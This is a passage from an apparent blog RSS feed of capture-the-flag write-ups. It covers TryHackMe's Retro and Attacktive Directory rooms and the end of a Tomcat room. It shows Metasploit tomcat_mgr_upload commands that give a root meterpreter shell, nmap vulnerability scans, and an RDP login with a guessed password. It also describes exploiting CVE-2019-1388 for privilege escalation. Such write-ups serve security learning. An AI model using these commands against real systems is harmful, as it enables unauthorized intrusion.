“Select WAR file to upload”.&lt;/p&gt;
&lt;p&gt;Now, &lt;code&gt;exploit/multi/http/tomcat_mgr_upload&lt;/code&gt; only targets 32-bit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/linux&quot;&gt;Linux&lt;/a&gt;, and the server is running a 64-bit build (this can also be found in /manager/html/), so we’ll use the “Java Universal” target.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;msfconsole&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;use exploit/multi/http/tomcat_mgr_upload&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set HttpPassword bubbles&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set HttpUsername bob&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set RHOSTS 10.10.28.154&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set RPORT 1234&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;set LHOST 10.13.26.40&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;And we have a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell! Running getuid reveals that we’re also running as root. Ouch.&lt;/p&gt;
&lt;p&gt;We’ll just drop to shell in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/meterpreter&quot; class=&quot;internal&quot; data-slug=&quot;spellbook/meterpreter&quot;&gt;meterpreter&lt;/a&gt; to get the contents of /root/flag.txt.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 7 min&lt;/p&gt;</description>
    <pubDate>Sun, 30 Jan 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Retro</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2022-01-02-retro</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2022-01-02-retro</guid>
    <description>&lt;h2 id=&quot;initial-reconnaissance&quot;&gt;Initial reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#initial-reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This CTF is an earlier version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/tales/2021-12-08-blaster&quot; class=&quot;internal alias&quot; data-slug=&quot;tales/2021-12-08-blaster&quot;&gt;Blaster&lt;/a&gt; without the step-by-step nature of that room. Not 100% sure what the differences are.&lt;/p&gt;
&lt;p&gt;The target IP is 10.10.20.185.&lt;/p&gt;
&lt;p&gt;As with Blaster, we’ll start out by running an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; retro&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.20.185&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This gives us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan  2 19:34:48 2022 as: nmap -v -oA retro -Pn -A -T4 -sS -script vuln -p- 10.10.20.185
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.20.185
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.013 days (since Sun Jan  2 19:29:09 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   37.05 ms  10.13.0.1
2   ... 3
4   180.52 ms 10.10.20.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  2 19:47:21 2022 -- 1 IP address (1 host up) scanned in 753.31 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we’ve got IIS and RDP running. Let’s start by taking a look around IIS.&lt;/p&gt;
&lt;h2 id=&quot;flag-1-the-hidden-directory&quot;&gt;Flag 1: The hidden directory&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1-the-hidden-directory&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;As with Blaster, we just have the default IIS welcome page. So let’s follow up with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; since we know from the flag list that there’s a hidden directory.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.20.185/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;h2 id=&quot;flag-2-usertxt&quot;&gt;Flag 2: user.txt&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-2-usertxt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Visiting the hidden directory reveals the same retro arcade website as Blaster. (I’m noticing a parallel here… I suspect that the rest of the CTF will also be the same, though I’m going to see if I can do this one with less guessing.)&lt;/p&gt;
&lt;p&gt;All of the posts are by “Wade”. I hadn’t noticed it the first time, but the “&lt;a href=&quot;https://en.wikipedia.org/wiki/Ready_Player_One&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Ready Player One&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;” post is actually suggestive that either Wade’s username or password is “Parzival”.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The comment immediately afterward seems to confirm this.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Theoretically I should use this information to generate a wordlist (who knows what permutations Wade is applying to “Parzival”, and whether this is Wade’s username or password). There’s a few &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/linux&quot;&gt;Kali Linux&lt;/a&gt; tools that could be used to harvest words from the hidden site and generate various common permutations, but all of these will result in quite a long list.&lt;/p&gt;
&lt;p&gt;In the real world, this is what I’d probably have to do. But since I kinda already know how this is going to shake out, let’s just skip ahead to logging in with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/xfreerdp&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/xfreerdp&quot;&gt;XFreeRDP&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;xfreerdp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dynamic-resolution&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; +clipboard&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /cert:ignore&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;         /v:10.10.20.185&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /u:Wade&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /p:parzival&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Unsurprisingly, this works. The user.txt file on the desktop contains the second flag (which is different than in Blaster!).&lt;/p&gt;
&lt;h2 id=&quot;flag-3-roottxt&quot;&gt;Flag 3: root.txt&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-3-roottxt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This flag is probably in &lt;code&gt;C:\Users\Administrator\Desktop\root.txt&lt;/code&gt;. But now things are diverging a bit…&lt;/p&gt;
&lt;p&gt;Wade has Google Chrome installed in this version of the CTF, and no other files are on the desktop.&lt;/p&gt;
&lt;p&gt;But poking around a bit reveals that things aren’t too far off Blaster.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;There’s an hhupd.exe executable in the Recycle Bin.&lt;/li&gt;
&lt;li&gt;Chrome has a single bookmark for “&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-1388&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;NVD — CVE-2019-1388&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;”.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Of course, the TryHackMe machine doesn’t have internet access, but we can follow this link locally. Moreover, searching for hhupd reveals that &lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this is a program that can be used to perform the attack&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;; that page helpfully links to &lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a YouTube video demonstrating how to leverage hhupd.exe in exactly this way&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The attack works somewhat differently on this system than in Blaster (or the demonstration video), however. Instead of opening up an Internet Explorer window outside of the secure desktop, IE is opened up &lt;em&gt;on&lt;/em&gt; the UAC desktop itself, and all interaction needs to take place there (we also get a choice of using IE or Chrome…). Still, overall things work more-or-less as we’d expect, and we can use the resulting elevated command prompt to read &lt;code&gt;C:\Users\Administrator\Desktop\root.txt.txt&lt;/code&gt; (note the extra .txt) to obtain the final flag.&lt;/p&gt;
&lt;p&gt;(I kinda feel like I cheated now, since I did Blaster first without realizing that this room was almost &lt;em&gt;exactly&lt;/em&gt; the same.)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 1 h 16 min&lt;/p&gt;</description>
    <pubDate>Sun, 02 Jan 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Attacktive Directory</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-12-30-attacktive-directory</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-12-30-attacktive-directory</guid>
    <description>&lt;h2 id=&quot;welcome-to-attacktive-directory&quot;&gt;Welcome to Attacktive Directory&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#welcome-to-attacktive-directory&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;As usual, we start off with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan. Our target IP address is 10.10.177.198.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; attacktive-directory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This gives us the following results.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Increasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.
Increasing send delay for 10.10.177.198 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Nmap scan report for 10.10.177.198
Host is up (0.18s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-31 03:31:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49823/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/30%OT=53%CT=1%CU=35966%PV=Y%DS=4%DC=T%G=Y%TM=61CE7D
OS:75%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS
OS:=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NN
OS:S%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y
OS:%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
OS:=Z)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   34.37 ms  10.13.0.1
2   ... 3
4   183.65 ms 10.10.177.198

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds
&lt;/code&gt;&lt;/pre&gt;
